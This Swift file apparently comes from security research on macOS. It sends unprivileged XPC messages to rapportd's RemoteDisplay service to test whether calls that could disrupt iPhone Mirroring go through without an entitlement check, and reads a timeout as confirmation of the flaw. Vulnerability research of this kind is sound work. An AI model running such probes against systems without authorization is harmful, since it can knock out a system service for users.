// Focused vulnerability probe for com.apple.RemoteDisplay
// Tests whether rapportd accepts remoteDisplayChangeDedicatedDevice:nil
// from an unprivileged process with no entitlement.
//
// Previous run: result was (pending) after 2s asyncAfter
// This run: waits FULL 6s — no asyncAfter shortcut
// TIMEOUT = method was decoded and accepted (no entitlement gate)
// INTERRUPTED = rapportd rejected (not in interface or entitlement check)

import Foundation

@objc protocol RPRemoteDisplayDaemonXPC: NSObjectProtocol {
    @objc optional func remoteDisplayChangeDedicatedDevice(_ device: AnyObject?)
    @objc optional func remoteDisplayPersonSelected(_ person: AnyObject?, forDedicatedPairing: Bool)
    @objc optional func remoteDisplayChangeDiscoverySessionStateForDevice(_ device: AnyObject?, reason: UInt32)
}

func probe(service: String, label: String, waitSeconds: Int,
           action: @escaping (RPRemoteDisplayDaemonXPC, DispatchSemaphore) -> Void) {
    print("\n=== [\(service)] \(label) ===")

    let conn = NSXPCConnection(machServiceName: service, options: [])
    let iface = NSXPCInterface(with: RPRemoteDisplayDaemonXPC.self)
    conn.remoteObjectInterface = iface

    var result = "(pending)"
    let sema = DispatchSemaphore(value: 0)

    conn.invalidationHandler = {
        if result == "(pending)" { result = "INVALIDATED (connection rejected at connect)" }
        sema.signal()
    }
    conn.interruptionHandler = {
        if result == "(pending)" { result = "INTERRUPTED — method NOT in interface OR entitlement checked at message decode" }
        sema.signal()
    }
    conn.resume()

    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        let e = err as NSError
        result = "ERROR: \(e.localizedDescription) [code=\(e.code)]"
        sema.signal()
    } as? RPRemoteDisplayDaemonXPC

    guard let p = proxy else {
        print("  Could not get typed proxy")
        conn.invalidate()
        return
    }
    print("  Proxy class: \(type(of: proxy as AnyObject))")

    action(p, sema)

    let deadline = DispatchTime.now() + .seconds(waitSeconds)
    if sema.wait(timeout: deadline) == .timedOut {
        result = "TIMEOUT (\(waitSeconds)s) *** NO REJECTION: METHOD WAS ACCEPTED WITHOUT ENTITLEMENT CHECK ***"
    }
    print("  RESULT: \(result)")
    conn.invalidate()
    Thread.sleep(forTimeInterval: 2.0)
}

// ---- MAIN ----

print("=== rapportd ChangeDedicatedDevice Vulnerability Probe v2 ===")
print("PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())")
print("Hypothesis: remoteDisplayChangeDedicatedDevice:nil is accepted by com.apple.RemoteDisplay")
print("           without entitlement check, allowing any process to disrupt iPhone Mirroring.\n")

// TEST 1 (primary): remoteDisplayChangeDedicatedDevice:nil — FULL 6s wait, no asyncAfter
// If rapportd rejects: we'll see INTERRUPTED within 1-2s
// If accepted: 6s elapses with no rejection → TIMEOUT = VULNERABILITY CONFIRMED
probe(service: "com.apple.RemoteDisplay",
      label: "remoteDisplayChangeDedicatedDevice:(nil) [FULL 6s wait, no early exit]",
      waitSeconds: 6) { p, sema in
    print("  Sending remoteDisplayChangeDedicatedDevice:nil ...")
    p.remoteDisplayChangeDedicatedDevice?(nil)
    print("  Message sent. Waiting for rapportd response...")
    // NO asyncAfter — we wait for the full timeout or interruptionHandler
}

// TEST 2: remoteDisplayPersonSelected:nil — can unprivileged process trigger person selection?
probe(service: "com.apple.RemoteDisplay",
      label: "remoteDisplayPersonSelected:(nil) forDedicatedPairing:false [6s wait]",
      waitSeconds: 6) { p, sema in
    print("  Sending remoteDisplayPersonSelected:nil forDedicatedPairing:false ...")
    p.remoteDisplayPersonSelected?(nil, forDedicatedPairing: false)
    print("  Message sent. Waiting...")
}

// CONTROL: remoteDisplayChangeDiscoverySessionStateForDevice — must return INTERRUPTED
// (confirmed in previous run — validates that INTERRUPTED means rejected)
probe(service: "com.apple.RemoteDisplay",
      label: "CONTROL: remoteDisplayChangeDiscoverySessionStateForDevice:(nil) reason:0",
      waitSeconds: 4) { p, sema in
    p.remoteDisplayChangeDiscoverySessionStateForDevice?(nil, reason: 0)
    DispatchQueue.global().asyncAfter(deadline: .now() + 3.5) { sema.signal() }
}

print("\n=== All probes complete. Check rapportd logs for this PID: \(ProcessInfo.processInfo.processIdentifier) ===")
